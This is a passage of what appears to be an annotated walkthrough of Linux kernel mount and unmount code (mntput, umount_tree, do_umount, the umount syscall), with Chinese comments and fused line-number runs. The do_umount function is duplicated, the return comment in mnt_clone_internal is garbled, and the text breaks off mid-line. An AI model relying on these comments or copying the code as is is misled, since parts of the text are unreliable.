文件系统可能无法进行读写-&gt;只读的转换。在处理mnt_count减少时使用的锁提供了屏障， * 所以下面的mnt_get_writers()是安全的。 */ WARN_ON(mnt_get_writers(mnt)); // 如果挂载点有引用计数，则杀死引用计数 if (unlikely(mnt-&gt;mnt_pins.first)) mnt_pin_kill(mnt); // 遍历挂载点的挂起子挂载点链表，删除每个子挂载点并释放引用计数 hlist_for_each_entry_safe(m, p, &amp;mnt-&gt;mnt_stuck_children, mnt_umount) &#123; hlist_del(&amp;m-&gt;mnt_umount); mntput(&amp;m-&gt;mnt); &#125; // 删除文件系统通知的虚拟文件系统挂载点 fsnotify_vfsmount_delete(&amp;mnt-&gt;mnt); // 释放根目录的引用计数 dput(mnt-&gt;mnt.mnt_root); // 停用超级块 deactivate_super(mnt-&gt;mnt.mnt_sb); // 释放挂载点的ID mnt_free_id(mnt); // 调用延迟释放虚拟文件系统挂载点的回调函数 call_rcu(&amp;mnt-&gt;mnt_rcu, delayed_free_vfsmnt);&#125;static void __cleanup_mnt(struct rcu_head *head)&#123; // 调用cleanup_mnt函数进行挂载点的清理 cleanup_mnt(container_of(head, struct mount, mnt_rcu));&#125;// 定义延迟释放挂载点的工作队列static LLIST_HEAD(delayed_mntput_list);static void delayed_mntput(struct work_struct *unused)&#123; // 从延迟挂载点列表中删除所有节点 struct llist_node *node = llist_del_all(&amp;delayed_mntput_list); struct mount *m, *t; // 遍历延迟挂载点列表中的每个挂载点，调用cleanup_mnt函数进行清理 llist_for_each_entry_safe(m, t, node, mnt_llist) cleanup_mnt(m);&#125;// 声明延迟挂载点的工作static DECLARE_DELAYED_WORK(delayed_mntput_work, delayed_mntput); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566static void mntput_no_expire(struct mount *mnt)&#123; LIST_HEAD(list); // 定义一个链表头 int count; // 定义一个计数器 rcu_read_lock(); // 获取读取RCU锁 if (likely(READ_ONCE(mnt-&gt;mnt_ns))) &#123; // 如果mnt的mnt_ns字段非空 /* * 由于我们在这里没有执行lock_mount_hash()， * -&gt;mnt_ns 可能在我们的操作期间发生变化。 * 但是，如果它非空，则存在一个引用， * 直到将 -&gt;mnt_ns 变为 NULL 之后的 RCU 延迟之后才会被释放。 * 因此，如果我们在 rcu_read_lock() 下观察到它非空， * 则我们要释放的引用不是最后一个引用。 */ mnt_add_count(mnt, -1); // 减少mnt的引用计数 rcu_read_unlock(); // 释放RCU锁 return; &#125; lock_mount_hash(); // 锁定mount哈希表 /* * 确保如果 __legitimize_mnt() 在我们获取 mount_lock 之前没有看到我们， * 我们将在此处看到他们的引用计数增加。 */ smp_mb(); // 内存屏障 mnt_add_count(mnt, -1); // 减少mnt的引用计数 count = mnt_get_count(mnt); // 获取mnt的引用计数 if (count != 0) &#123; // 如果引用计数不为0 WARN_ON(count &lt; 0); // 发出警告 rcu_read_unlock(); // 释放RCU锁 unlock_mount_hash(); // 解锁mount哈希表 return; &#125; if (unlikely(mnt-&gt;mnt.mnt_flags &amp; MNT_DOOMED)) &#123; // 如果mnt的mnt_flags字段包含MNT_DOOMED标志 rcu_read_unlock(); // 释放RCU锁 unlock_mount_hash(); // 解锁mount哈希表 return; &#125; mnt-&gt;mnt.mnt_flags |= MNT_DOOMED; // 设置mnt的mnt_flags字段的MNT_DOOMED标志 rcu_read_unlock(); // 释放RCU锁 list_del(&amp;mnt-&gt;mnt_instance); // 从链表中删除mnt节点 if (unlikely(!list_empty(&amp;mnt-&gt;mnt_mounts))) &#123; // 如果mnt的mnt_mounts链表非空 struct mount *p, *tmp; list_for_each_entry_safe(p, tmp, &amp;mnt-&gt;mnt_mounts, mnt_child) &#123; // 遍历mnt的mnt_mounts链表 __put_mountpoint(unhash_mnt(p), &amp;list); // 释放p的挂载点 hlist_add_head(&amp;p-&gt;mnt_umount, &amp;mnt-&gt;mnt_stuck_children); // 将p的mnt_umount节点添加到mnt的mnt_stuck_children哈希链表头部 &#125; &#125; unlock_mount_hash(); // 解锁mount哈希表 shrink_dentry_list(&amp;list); // 收缩链表 if (likely(!(mnt-&gt;mnt.mnt_flags &amp; MNT_INTERNAL))) &#123; // 如果mnt的mnt_flags字段不包含MNT_INTERNAL标志 struct task_struct *task = current; // 获取当前进程的task_struct结构体指针 if (likely(!(task-&gt;flags &amp; PF_KTHREAD))) &#123; // 如果当前进程不是内核线程 init_task_work(&amp;mnt-&gt;mnt_rcu, __cleanup_mnt); // 初始化mnt的mnt_rcu字段 if (!task_work_add(task, &amp;mnt-&gt;mnt_rcu, TWA_RESUME)) // 将mnt的mnt_rcu字段添加到当前进程的task_struct的工作队列中 return; &#125; if (llist_add(&amp;mnt-&gt;mnt_llist, &amp;delayed_mntput_list)) // 将mnt的mnt_llist节点添加到delayed_mntput_list链表中 schedule_delayed_work(&amp;delayed_mntput_work, 1); // 延迟执行delayed_mntput_work函数 return; &#125; cleanup_mnt(mnt); // 清理mnt&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void mntput(struct vfsmount *mnt)&#123; if (mnt) &#123; // 如果mnt非空 struct mount *m = real_mount(mnt); // 获取mnt对应的mount结构体指针 /* 避免缓存行来回跳动，希望gcc不会变得“聪明” */ if (unlikely(m-&gt;mnt_expiry_mark)) // 如果mount的mnt_expiry_mark字段为真 m-&gt;mnt_expiry_mark = 0; // 将mount的mnt_expiry_mark字段置为0 mntput_no_expire(m); // 调用mntput_no_expire函数释放mount &#125;&#125;EXPORT_SYMBOL(mntput); // 导出mntput函数struct vfsmount *mntget(struct vfsmount *mnt)&#123; if (mnt) mnt_add_count(real_mount(mnt), 1); // 增加mnt对应的mount的引用计数 return mnt;&#125;EXPORT_SYMBOL(mntget); // 导出mntget函数/* * 使挂载点对新的查找不可访问。 * 因为可能仍然有当前用户，调用者必须在销毁挂载点之前等待RCU宽限期。 */void mnt_make_shortterm(struct vfsmount *mnt)&#123; if (mnt) real_mount(mnt)-&gt;mnt_ns = NULL; // 将mnt对应的mount的mnt_ns字段置为NULL&#125;/** * path_is_mountpoint() - 检查路径是否是当前命名空间中的挂载点。 * @path: 要检查的路径 * * d_mountpoint() 只能可靠地用于确定一个dentry是否未在任何命名空间中挂载， * 并且这种常见情况在内联中处理。 * d_mountpoint() 不知道可能有多个挂载使用给定dentry的可能性， * 而这些挂载位于不同的命名空间中。此函数检查传入的路径是否是挂载点，而不仅仅是dentry本身。 */bool path_is_mountpoint(const struct path *path)&#123; unsigned seq; bool res; if (!d_mountpoint(path-&gt;dentry)) // 如果dentry不是挂载点 return false; rcu_read_lock(); // 获取读取RCU锁 do &#123; seq = read_seqbegin(&amp;mount_lock); // 读取mount_lock的序列号 res = __path_is_mountpoint(path); // 调用__path_is_mountpoint函数检查路径是否是挂载点 &#125; while (read_seqretry(&amp;mount_lock, seq)); // 如果mount_lock的序列号发生变化，则重试 rcu_read_unlock(); // 释放RCU锁 return res;&#125;EXPORT_SYMBOL(path_is_mountpoint); // 导出path_is_mountpoint函数 123456789struct vfsmount *mnt_clone_internal(const struct path *path)&#123; struct mount *p; // 定义一个指向struct mount结构体的指针p p = clone_mnt(real_mount(path-&gt;mnt), path-&gt;dentry, CL_PRIVATE); // 调用clone_mnt函数克隆mount，并将结果赋值给p if (IS_ERR(p)) // 如果p是一个错误指针 return ERR_CAST(p); // 返回将p转换为错误类型的指针 p-&gt;mnt.mnt_flags |= MNT_INTERNAL; // 将mount的mnt_flags字段的MNT_INTERNAL标志置为真 return &amp;p-&gt;mnt; // 返回指向mount的mnt字段_mounts结构体中的ns成员和prev指向的struct list_head结构体&#125; 1234567891011121314151617181920212223242526272829303132333435363738#ifdef CONFIG_PROC_FSstatic struct mount *mnt_list_next(struct mnt_namespace *ns, struct list_head *p)&#123; struct mount *mnt, *ret = NULL; // 定义两个指向struct mount结构体的指针mnt和ret lock_ns_list(ns); // 锁定命名空间的列表 list_for_each_continue(p, &amp;ns-&gt;list) &#123; // 遍历命名空间的列表 mnt = list_entry(p, typeof(*mnt), mnt_list); // 将p转换为struct mount结构体指针mnt if (!mnt_is_cursor(mnt)) &#123; // 如果mnt不是游标 ret = mnt; // 将mnt赋值给ret break; // 跳出循环 &#125; &#125; unlock_ns_list(ns); // 解锁命名空间的列表 return ret; // 返回ret&#125;/* iterator; we want it to have access to namespace_sem, thus here... ... */static void *m_start(struct seq_file *m, loff_t *pos)&#123; struct proc_mounts *p = m-&gt;private; // 定义一个指向struct proc_mounts结构体的指针p，指向seq_file结构体的private成员 struct list_head *prev; // 定义一个指向struct list_head结构体的指针prev down_read(&amp;namespace_sem); // 获取读取锁，保证并发安全性 if (!*pos) &#123; // 如果pos指向的值为0 prev = &amp;p-&gt;ns-&gt;list; // prev指向p指向的struct proc_mounts结构体中的ns成员的list成员 &#125; else &#123; // 否则 prev = &amp;p-&gt;cursor.mnt_list; // prev指向p指向的struct proc_mounts结构体中的cursor成员的mnt_list成员 /* Read after we&#x27;d reached the end? */ if (list_empty(prev)) // 如果prev指向的链表为空 return NULL; // 返回空指针 &#125; return mnt_list_next(p-&gt;ns, prev); // 返回调用mnt_list_next函数的结果，传入参数p指向的struct proc_mounts结构体中的ns成员和prev指向的struct list_head结构体&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546static void *m_next(struct seq_file *m, void *v, loff_t *pos)&#123; struct proc_mounts *p = m-&gt;private; // 定义一个指向struct proc_mounts结构体的指针p，指向seq_file结构体的private成员 struct mount *mnt = v; // 定义一个指向struct mount结构体的指针mnt，指向参数v ++*pos; // 增加pos指向的值 return mnt_list_next(p-&gt;ns, &amp;mnt-&gt;mnt_list); // 返回调用mnt_list_next函数的结果，传入参数p指向的struct proc_mounts结构体中的ns成员和mnt指向的struct mount结构体的mnt_list成员&#125;static void m_stop(struct seq_file *m, void *v)&#123; struct proc_mounts *p = m-&gt;private; // 定义一个指向struct proc_mounts结构体的指针p，指向seq_file结构体的private成员 struct mount *mnt = v; // 定义一个指向struct mount结构体的指针mnt，指向参数v lock_ns_list(p-&gt;ns); // 锁定命名空间的列表 if (mnt) list_move_tail(&amp;p-&gt;cursor.mnt_list, &amp;mnt-&gt;mnt_list); // 将p指向的struct proc_mounts结构体中的cursor成员的mnt_list成员移动到mnt指向的struct mount结构体的mnt_list成员之后 else list_del_init(&amp;p-&gt;cursor.mnt_list); // 从p指向的struct proc_mounts结构体中的cursor成员的mnt_list成员中删除并初始化 unlock_ns_list(p-&gt;ns); // 解锁命名空间的列表 up_read(&amp;namespace_sem); // 释放读取锁&#125;static int m_show(struct seq_file *m, void *v)&#123; struct proc_mounts *p = m-&gt;private; // 定义一个指向struct proc_mounts结构体的指针p，指向seq_file结构体的private成员 struct mount *r = v; // 定义一个指向struct mount结构体的指针r，指向参数v return p-&gt;show(m, &amp;r-&gt;mnt); // 调用p指向的struct proc_mounts结构体中的show成员函数，传入参数m和r指向的struct mount结构体的mnt成员的地址&#125;const struct seq_operations mounts_op = &#123; .start = m_start, // 设置start成员为m_start函数 .next = m_next, // 设置next成员为m_next函数 .stop = m_stop, // 设置stop成员为m_stop函数 .show = m_show, // 设置show成员为m_show函数&#125;;void mnt_cursor_del(struct mnt_namespace *ns, struct mount *cursor)&#123; down_read(&amp;namespace_sem); // 获取读取锁，保证并发安全性 lock_ns_list(ns); // 锁定命名空间的列表 list_del(&amp;cursor-&gt;mnt_list); // 从cursor指向的struct mount结构体的mnt_list成员中删除 unlock_ns_list(ns); // 解锁命名空间的列表 up_read(&amp;namespace_sem); // 释放读取锁&#125;#endif /* CONFIG_PROC_FS */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * may_umount_tree - 检查挂载树是否繁忙 * @m: 挂载树的根节点 * * 此函数用于检查挂载树中是否有打开的文件、当前工作目录、chroot或子挂载点处于繁忙状态。 */int may_umount_tree(struct vfsmount *m)&#123; struct mount *mnt = real_mount(m); // 获取实际的挂载点 int actual_refs = 0; // 实际引用计数 int minimum_refs = 0; // 最小引用计数 struct mount *p; // 用于遍历挂载点的指针 BUG_ON(!m); // 断言，如果m为空，则触发BUG /* 需要写锁来获取mnt的引用计数 */ lock_mount_hash(); // 锁定挂载点哈希表 for (p = mnt; p; p = next_mnt(p, mnt)) &#123; actual_refs += mnt_get_count(p); // 累加实际引用计数 minimum_refs += 2; // 最小引用计数加2 &#125; unlock_mount_hash(); // 解锁挂载点哈希表 if (actual_refs &gt; minimum_refs) return 0; // 如果实际引用计数大于最小引用计数，则返回0，表示繁忙 return 1; // 否则返回1，表示未繁忙&#125;EXPORT_SYMBOL(may_umount_tree); // 导出符号，使其可被其他模块使用/** * may_umount - 检查挂载点是否繁忙 * @mnt: 挂载点的根节点 * * 此函数用于检查挂载点中是否有打开的文件、当前工作目录、chroot或子挂载点。如果挂载点有子挂载点，无论子挂载点是否繁忙，都将返回繁忙状态。 * * 不考虑配额等因素。也就是说，在某些情况下，它可能会给出错误的结果。它存在的主要原因是我们需要一种非破坏性的方式来查找可以轻松卸载的文件系统。 */int may_umount(struct vfsmount *mnt)&#123; int ret = 1; // 返回值，默认为1，表示未繁忙 down_read(&amp;namespace_sem); // 获取命名空间信号量的读锁 lock_mount_hash(); // 锁定挂载点哈希表 if (propagate_mount_busy(real_mount(mnt), 2)) // 如果挂载点或其子挂载点繁忙 ret = 0; // 将返回值设为0，表示繁忙 unlock_mount_hash(); // 解锁挂载点哈希表 up_read(&amp;namespace_sem); // 释放命名空间信号量的读锁 return ret; // 返回结果&#125;EXPORT_SYMBOL(may_umount); // 导出符号，使其可被其他模块使用 1234567891011121314151617181920212223242526272829303132333435static void namespace_unlock(void)&#123; struct hlist_head head; // 哈希表头 struct hlist_node *p; // 哈希表节点指针 struct mount *m; // 挂载点指针 LIST_HEAD(list); // 链表头 hlist_move_list(&amp;unmounted, &amp;head); // 将unmounted链表移动到head哈希表中 list_splice_init(&amp;ex_mountpoints, &amp;list); // 将ex_mountpoints链表合并到list链表中 up_write(&amp;namespace_sem); // 释放命名空间信号量的写锁 shrink_dentry_list(&amp;list); // 收缩dentry列表 if (likely(hlist_empty(&amp;head))) return; // 如果head哈希表为空，则直接返回 synchronize_rcu_expedited(); // 同步RCU hlist_for_each_entry_safe(m, p, &amp;head, mnt_umount) &#123; hlist_del(&amp;m-&gt;mnt_umount); // 从head哈希表中删除挂载点 mntput(&amp;m-&gt;mnt); // 释放挂载点 &#125;&#125;static inline void namespace_lock(void)&#123; down_write(&amp;namespace_sem); // 获取命名空间信号量的写锁&#125;enum umount_tree_flags &#123; UMOUNT_SYNC = 1, // 同步卸载标志 UMOUNT_PROPAGATE = 2, // 传播卸载标志 UMOUNT_CONNECTED = 4, // 连接卸载标志&#125;; 12345678910111213141516171819202122232425static bool disconnect_mount(struct mount *mnt, enum umount_tree_flags how)&#123; /* 只有对于延迟卸载，保持挂载连接才有效 */ if (how &amp; UMOUNT_SYNC) return true; // 返回true，表示保持连接 /* 没有父挂载点的挂载点无需连接 */ if (!mnt_has_parent(mnt)) return true; // 返回true，表示无需连接 /* 因为在挂载点卸载和连接时引用计数规则发生变化，已卸载的挂载点不能连接到已挂载的挂载点 */ if (!(mnt-&gt;mnt_parent-&gt;mnt.mnt_flags &amp; MNT_UMOUNT)) return true; // 返回true，表示无需连接 /* 是否请求保持挂载连接？ */ if (how &amp; UMOUNT_CONNECTED) return false; // 返回false，表示保持连接 /* 挂载点是否被锁定需要保持连接？ */ if (IS_MNT_LOCKED(mnt)) return false; // 返回false，表示保持连接 /* 默认情况下断开挂载连接 */ return true; // 返回true，表示断开连接&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/* * mount_lock must be held * namespace_sem must be held for write */static void umount_tree(struct mount *mnt, enum umount_tree_flags how)&#123; LIST_HEAD(tmp_list); // 定义临时链表tmp_list struct mount *p; // 定义挂载点指针p if (how &amp; UMOUNT_PROPAGATE) propagate_mount_unlock(mnt); // 如果设置了UMOUNT_PROPAGATE标志，则解锁挂载点的传播 /* 收集需要卸载的挂载点 */ for (p = mnt; p; p = next_mnt(p, mnt)) &#123; p-&gt;mnt.mnt_flags |= MNT_UMOUNT; // 设置挂载点的卸载标志 list_move(&amp;p-&gt;mnt_list, &amp;tmp_list); // 将挂载点从mnt_mounts链表移动到tmp_list链表中 &#125; /* 从mnt_mounts链表中隐藏挂载点 */ list_for_each_entry(p, &amp;tmp_list, mnt_list) &#123; list_del_init(&amp;p-&gt;mnt_child); // 从挂载点的父挂载点的mnt_mounts链表中删除挂载点 &#125; /* 将传播的挂载点添加到tmp_list链表中 */ if (how &amp; UMOUNT_PROPAGATE) propagate_umount(&amp;tmp_list); // 将传播的挂载点添加到tmp_list链表中 while (!list_empty(&amp;tmp_list)) &#123; struct mnt_namespace *ns; // 命名空间指针 bool disconnect; // 是否断开连接的标志 p = list_first_entry(&amp;tmp_list, struct mount, mnt_list); // 获取tmp_list链表的第一个挂载点 list_del_init(&amp;p-&gt;mnt_expire); // 从tmp_list链表中删除挂载点 list_del_init(&amp;p-&gt;mnt_list); // 从tmp_list链表中删除挂载点 ns = p-&gt;mnt_ns; // 获取挂载点所属的命名空间 if (ns) &#123; ns-&gt;mounts--; // 命名空间的挂载点数减1 __touch_mnt_namespace(ns); // 更新命名空间的时间戳 &#125; p-&gt;mnt_ns = NULL; // 将挂载点的命名空间指针置为NULL if (how &amp; UMOUNT_SYNC) p-&gt;mnt.mnt_flags |= MNT_SYNC_UMOUNT; // 如果设置了UMOUNT_SYNC标志，则设置挂载点的同步卸载标志 disconnect = disconnect_mount(p, how); // 检查是否需要断开挂载连接 if (mnt_has_parent(p)) &#123; mnt_add_count(p-&gt;mnt_parent, -1); // 父挂载点的引用计数减1 if (!disconnect) &#123; /* 不要忘记p */ list_add_tail(&amp;p-&gt;mnt_child, &amp;p-&gt;mnt_parent-&gt;mnt_mounts); // 将挂载点添加到父挂载点的mnt_mounts链表末尾 &#125; else &#123; umount_mnt(p); // 卸载挂载点 &#125; &#125; change_mnt_propagation(p, MS_PRIVATE); // 修改挂载点的传播标志为MS_PRIVATE if (disconnect) hlist_add_head(&amp;p-&gt;mnt_umount, &amp;unmounted); // 将挂载点添加到unmounted哈希表中 &#125;&#125;static void shrink_submounts(struct mount *mnt); 1234567891011121314151617181920212223242526272829303132333435static int do_umount_root(struct super_block *sb)&#123; int ret = 0; // 获取超级块的卸载信号量的写锁 down_write(&amp;sb-&gt;s_umount); // 检查超级块是否为只读 if (!sb_rdonly(sb)) &#123; struct fs_context *fc; // 创建一个新的文件系统上下文，用于将超级块的根目录重新配置为只读 fc = fs_context_for_reconfigure(sb-&gt;s_root, SB_RDONLY, SB_RDONLY); // 检查文件系统上下文的创建是否成功 if (IS_ERR(fc)) &#123; ret = PTR_ERR(fc); // 将返回值设置为错误代码 &#125; else &#123; // 解析整体挂载数据，并根据解析结果设置返回值 ret = parse_monolithic_mount_data(fc, NULL); // 如果解析成功，则重新配置超级块，并根据结果设置返回值 if (!ret) ret = reconfigure_super(fc); // 释放文件系统上下文 put_fs_context(fc); &#125; &#125; // 释放超级块的卸载信号量的写锁 up_write(&amp;sb-&gt;s_umount); return ret; // 返回最终的返回值&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384static int do_umount(struct mount *mnt, int flags)&#123; struct super_block *sb = mnt-&gt;mnt.mnt_sb; int retval; // 调用安全模块的 sb_umount 函数，检查是否允许卸载操作 retval = security_sb_umount(&amp;mnt-&gt;mnt, flags); if (retval) return retval; /* * 允许用户空间请求过期挂载点而不是无条件卸载。只有在以下情况下才会执行卸载操作： * (1) 标记已经被设置（标记会在 mntput() 中清除） * (2) 使用计数 == 1（父 vfsmount）+ 1（sys_umount） */ if (flags &amp; MNT_EXPIRE) &#123; if (&amp;mnt-&gt;mnt == current-&gt;fs-&gt;root.mnt || flags &amp; (MNT_FORCE | MNT_DETACH)) return -EINVAL; /* * 如果我们检查了所有竞争情况，可能不一定需要在这里加锁，但这是一个慢路径。 */ lock_mount_hash(); if (mnt_get_count(mnt) != 2) &#123; unlock_mount_hash(); return -EBUSY; &#125; unlock_mount_hash(); if (!xchg(&amp;mnt-&gt;mnt_expiry_mark, 1)) return -EAGAIN; &#125; /* * 如果我们可能需要中止操作以退出此挂载点，并且它们本身将持有资源，我们必须允许文件系统执行操作。 * 在“Unix 以用户空间为中心”的传统中，umount_begin 可能无法在第一次运行时完成，因为其他任务必须返回等等。这是挂载程序目前需要担心的问题。 */ if (flags &amp; MNT_FORCE &amp;&amp; sb-&gt;s_op-&gt;umount_begin) &#123; sb-&gt;s_op-&gt;umount_begin(sb); &#125; /* * 没有必要为此测试获取锁，但测试本身看起来有些错误。有更好的替代方案吗？ * 哦哼...原则上，我们可以将其视为卸载 + 切换到 rootfs。GC 最终会处理旧的 vfsmount。 * 实际上是有意义的，特别是如果 rootfs 包含一个 /reboot - 静态二进制文件，它会关闭所有描述符并调用 reboot(9)。然后 init(8) 可以卸载 root 并执行 /reboot。 */ if (&amp;mnt-&gt;mnt == current-&gt;fs-&gt;root.mnt &amp;&amp; !(flags &amp; MNT_DETACH)) &#123; /* * 特殊情况下的“卸载”根目录... * 我们只尝试将其重新挂载为只读。 */ if (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) return -EPERM; return do_umount_root(sb); &#125; namespace_lock(); lock_mount_hash(); /* 在持有锁的情况下重新检查 MNT_LOCKED */ retval = -EINVAL; if (mnt-&gt;mnt.mnt_flags &amp; MNT_LOCKED) goto out; event++; if (flags &amp; MNT_DETACH) &#123; if (!list_empty(&amp;mnt-&gt;mnt_list)) umount_tree(mnt, UMOUNT_PROPAGATE); retval = 0; &#125; else &#123; shrink_submounts(mnt); retval = -EBUSY; if (!propagate_mount_busy(mnt, 2)) &#123; if (!list_empty(&amp;mnt-&gt;mnt_list)) umount_tree(mnt, UMOUNT_PROPAGATE|UMOUNT_SYNC); retval = 0; &#125; &#125;out: unlock_mount_hash(); namespace_unlock(); return retval;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384static int do_umount(struct mount *mnt, int flags)&#123; struct super_block *sb = mnt-&gt;mnt.mnt_sb; int retval; // 调用安全模块的 sb_umount 函数，检查是否允许卸载操作 retval = security_sb_umount(&amp;mnt-&gt;mnt, flags); if (retval) return retval; /* * 允许用户空间请求过期挂载点而不是无条件卸载。只有在以下情况下才会执行卸载操作： * (1) 标记已经被设置（标记会在 mntput() 中清除） * (2) 使用计数 == 1（父 vfsmount）+ 1（sys_umount） */ if (flags &amp; MNT_EXPIRE) &#123; if (&amp;mnt-&gt;mnt == current-&gt;fs-&gt;root.mnt || flags &amp; (MNT_FORCE | MNT_DETACH)) return -EINVAL; /* * 如果我们检查了所有竞争情况，可能不一定需要在这里加锁，但这是一个慢路径。 */ lock_mount_hash(); if (mnt_get_count(mnt) != 2) &#123; unlock_mount_hash(); return -EBUSY; &#125; unlock_mount_hash(); if (!xchg(&amp;mnt-&gt;mnt_expiry_mark, 1)) return -EAGAIN; &#125; /* * 如果我们可能需要中止操作以退出此挂载点，并且它们本身将持有资源，我们必须允许文件系统执行操作。 * 在“Unix 以用户空间为中心”的传统中，umount_begin 可能无法在第一次运行时完成，因为其他任务必须返回等等。这是挂载程序目前需要担心的问题。 */ if (flags &amp; MNT_FORCE &amp;&amp; sb-&gt;s_op-&gt;umount_begin) &#123; sb-&gt;s_op-&gt;umount_begin(sb); &#125; /* * 没有必要为此测试获取锁，但测试本身看起来有些错误。有更好的替代方案吗？ * 哦哼...原则上，我们可以将其视为卸载 + 切换到 rootfs。GC 最终会处理旧的 vfsmount。 * 实际上是有意义的，特别是如果 rootfs 包含一个 /reboot - 静态二进制文件，它会关闭所有描述符并调用 reboot(9)。然后 init(8) 可以卸载 root 并执行 /reboot。 */ if (&amp;mnt-&gt;mnt == current-&gt;fs-&gt;root.mnt &amp;&amp; !(flags &amp; MNT_DETACH)) &#123; /* * 特殊情况下的“卸载”根目录... * 我们只尝试将其重新挂载为只读。 */ if (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) return -EPERM; return do_umount_root(sb); &#125; namespace_lock(); lock_mount_hash(); /* 在持有锁的情况下重新检查 MNT_LOCKED */ retval = -EINVAL; if (mnt-&gt;mnt.mnt_flags &amp; MNT_LOCKED) goto out; event++; if (flags &amp; MNT_DETACH) &#123; if (!list_empty(&amp;mnt-&gt;mnt_list)) umount_tree(mnt, UMOUNT_PROPAGATE); retval = 0; &#125; else &#123; shrink_submounts(mnt); retval = -EBUSY; if (!propagate_mount_busy(mnt, 2)) &#123; if (!list_empty(&amp;mnt-&gt;mnt_list)) umount_tree(mnt, UMOUNT_PROPAGATE|UMOUNT_SYNC); retval = 0; &#125; &#125;out: unlock_mount_hash(); namespace_unlock(); return retval;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* * __detach_mounts - 懒惰地卸载指定 dentry 上的所有挂载点 * * 在 unlink、rmdir 和 d_drop 过程中，有可能丢失对现有挂载点的路径， * 导致挂载点泄漏。detach_mounts 允许懒惰地卸载这些挂载点，而不是泄漏它们。 * * 调用者可能持有 dentry-&gt;d_inode-&gt;i_mutex。 */void __detach_mounts(struct dentry *dentry)&#123; struct mountpoint *mp; struct mount *mnt; namespace_lock(); // 锁定命名空间 lock_mount_hash(); // 锁定挂载哈希表 mp = lookup_mountpoint(dentry); // 查找挂载点 if (!mp) goto out_unlock; event++; // 增加事件计数 while (!hlist_empty(&amp;mp-&gt;m_list)) &#123; mnt = hlist_entry(mp-&gt;m_list.first, struct mount, mnt_mp_list); if (mnt-&gt;mnt.mnt_flags &amp; MNT_UMOUNT) &#123; umount_mnt(mnt); // 卸载挂载点 hlist_add_head(&amp;mnt-&gt;mnt_umount, &amp;unmounted); // 将挂载点添加到已卸载列表 &#125; else umount_tree(mnt, UMOUNT_CONNECTED); // 卸载整个挂载树 &#125; put_mountpoint(mp); // 释放挂载点引用计数out_unlock: unlock_mount_hash(); // 解锁挂载哈希表 namespace_unlock(); // 解锁命名空间&#125;/* * 调用者是否被允许修改其命名空间？ */bool may_mount(void)&#123; return ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN); // 检查是否具有 CAP_SYS_ADMIN 权限&#125;static void warn_mandlock(void)&#123; pr_warn_once(&quot;=======================================================\\n&quot; &quot;警告：mand 挂载选项已被弃用，并且在此内核中被忽略。\\n&quot; &quot;从挂载中删除 mand 选项以消除此警告。\\n&quot; &quot;=======================================================\\n&quot;);&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static int can_umount(const struct path *path, int flags)&#123; struct mount *mnt = real_mount(path-&gt;mnt); if (!may_mount()) return -EPERM; // 如果调用者没有挂载权限，则返回权限错误 if (path-&gt;dentry != path-&gt;mnt-&gt;mnt_root) return -EINVAL; // 如果路径的 dentry 不是挂载点的根目录，则返回无效参数错误 if (!check_mnt(mnt)) return -EINVAL; // 如果挂载点无效，则返回无效参数错误 if (mnt-&gt;mnt.mnt_flags &amp; MNT_LOCKED) /* Check optimistically */ return -EINVAL; // 如果挂载点被锁定，则返回无效参数错误 if (flags &amp; MNT_FORCE &amp;&amp; !capable(CAP_SYS_ADMIN)) return -EPERM; // 如果强制卸载标志被设置且调用者没有 CAP_SYS_ADMIN 权限，则返回权限错误 return 0; // 返回成功&#125;// caller is responsible for flags being saneint path_umount(struct path *path, int flags)&#123; struct mount *mnt = real_mount(path-&gt;mnt); int ret; ret = can_umount(path, flags); // 检查是否可以卸载 if (!ret) ret = do_umount(mnt, flags); // 执行卸载操作 /* we mustn&#x27;t call path_put() as that would clear mnt_expiry_mark */ dput(path-&gt;dentry); // 释放 dentry 引用计数 mntput_no_expire(mnt); // 释放挂载点引用计数，不更新过期标记 return ret; // 返回结果&#125;static int ksys_umount(char __user *name, int flags)&#123; int lookup_flags = LOOKUP_MOUNTPOINT; struct path path; int ret; // basic validity checks done first if (flags &amp; ~(MNT_FORCE | MNT_DETACH | MNT_EXPIRE | UMOUNT_NOFOLLOW)) return -EINVAL; // 如果标志位中包含未定义的标志，则返回无效参数错误 if (!(flags &amp; UMOUNT_NOFOLLOW)) lookup_flags |= LOOKUP_FOLLOW; // 如果没有设置 UMOUNT_NOFOLLOW 标志，则设置 LOOKUP_FOLLOW 标志 ret = user_path_at(AT_FDCWD, name, lookup_flags, &amp;path); // 获取路径对应的 path 结构体 if (ret) return ret; // 如果获取路径失败，则返回错误 return path_umount(&amp;path, flags); // 执行路径卸载操作&#125; 123456789101112131415161718192021222324252627282930313233SYSCALL_DEFINE2(umount, char __user *, name, int, flags)&#123; return ksys_umount(name, flags);&#125;#ifdef __ARCH_WANT_SYS_OLDUMOUNT/* * 2.0兼容的umount，没有标志位。 */SYSCALL_DEFINE1(oldumount, char __user *, name)&#123; return ksys_umount(name, 0);&#125;#endifstatic bool is_mnt_ns_file(struct dentry *dentry)&#123; /* 这是一个用于挂载命名空间的代理吗？ */ return dentry-&gt;d_op == &amp;ns_dentry_operations &amp;&amp; dentry-&gt;d_fsdata == &amp;mntns_operations;&#125;static struct mnt_namespace *to_mnt_ns(struct ns_common *ns)&#123; return container_of(ns, struct mnt_namespace, ns);&#125;struct ns_common *from_mnt_ns(struct mnt_namespace *mnt)&#123; return &amp;mnt-&gt;ns;&#125; 12345678910static bool mnt_ns_loop(struct dentry *dentry)&#123; /* 绑定挂载挂载命名空间inode是否会导致挂载命名空间循环？ */ struct mnt_namespace *mnt_ns; if (!is_mnt_ns_file(dentry)) return false; mnt_ns = to_mnt_ns(get_proc_ns(dentry-&gt;d_inode)); return current-&gt;nsproxy-&gt;mnt_ns-&gt;seq &gt;= 